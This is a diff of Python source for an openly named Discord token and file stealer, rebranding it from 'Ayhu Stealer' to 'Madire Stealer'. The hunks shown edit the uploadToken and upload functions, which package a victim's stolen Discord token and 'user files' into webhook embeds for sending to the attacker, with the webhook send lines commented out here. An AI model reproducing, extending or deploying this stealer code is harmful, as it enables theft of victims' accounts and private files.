@@ -272,16 +272,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@Ayhu Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
+                "text": "Madire Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
-        "username": "Ayhu Stealer",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&",
+        "username": "Madire Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -308,20 +308,20 @@ def upload(name, tk=''):
             "color": 14406413,
             "fields": [
                 {
-                "name": "Interesting files found on user PC:",
+                "name": "okay, here user files:",
                 "value": tk
                 }
             ],
             "author": {
-                "name": "Ayhu | File Stealer"
+                "name": "Madire | File Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
+                "text": "Madire Stealer",
+                "icon_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&"
             }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1502805154087440486/1503473556636569770/okaymadira.png?ex=6a037a5d&is=6a0228dd&hm=98916a893dce76c676b8def9572632f4d9b24b855974cedbc7f83b4dc205ddc1&",
         "attachments": []
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
